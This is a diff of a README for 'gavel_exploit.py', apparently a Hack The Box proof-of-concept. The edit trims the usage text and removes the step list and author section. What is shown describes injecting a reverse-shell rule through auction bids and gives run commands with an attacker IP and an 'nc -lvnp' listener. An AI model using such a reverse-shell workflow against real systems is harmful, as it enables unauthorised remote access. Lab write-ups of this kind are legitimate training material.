@@ -115,20 +115,11 @@ pip install requests
 python3 gavel_exploit.py <LHOST> <LPORT>
 ```
 
-Examples:
+Example:
 
 ```bash
 python3 gavel_exploit.py 10.10.14.70 5050
-python3 gavel_exploit.py 10.10.14.70 4444
 ```
-
-The script will:
-
-1. Log in as `auctioneer`
-2. Enumerate and display candidate auctions
-3. Inject the reverse shell rule and place bids
-4. Start `nc -lvnp <LPORT>` for you
-5. Trigger the generated shell once the listener is up
 
 ### Without auto listener
 
@@ -144,14 +135,7 @@ Then, in another terminal:
 nc -lvnp <LPORT>
 ```
 
-The script will still:
-
-- Log in
-- Inject the payload
-- Place a bid
-- Trigger the reverse shell via HTTP
-
-…but will **not** start `nc` for you.
+The script will **not** start `nc` for you.
 
 ---
 
@@ -165,12 +149,6 @@ positional arguments:
 optional arguments:
   --no-listen   Skip auto listener (start your own nc manually)
 ```
-
-Port notes:
-
-- Ports **below 1024** require root/administrator privileges.
-- Ports **above 10000** might be filtered in some environments; common good choices are `4444`, `9001`, `5050`, etc.
-
 ---
 
 ## Customization
@@ -218,10 +196,5 @@ Using this PoC against real-world infrastructure without permission is **illegal
 You are solely responsible for how you use this code.
 
 ---
-
-## Author
-
-- **Handle:** `copper_nail` aka `symphony2colour`  
-- **Platform:** Hack The Box  
 
 If you found this useful, drop a ⭐ on the repo 🙂
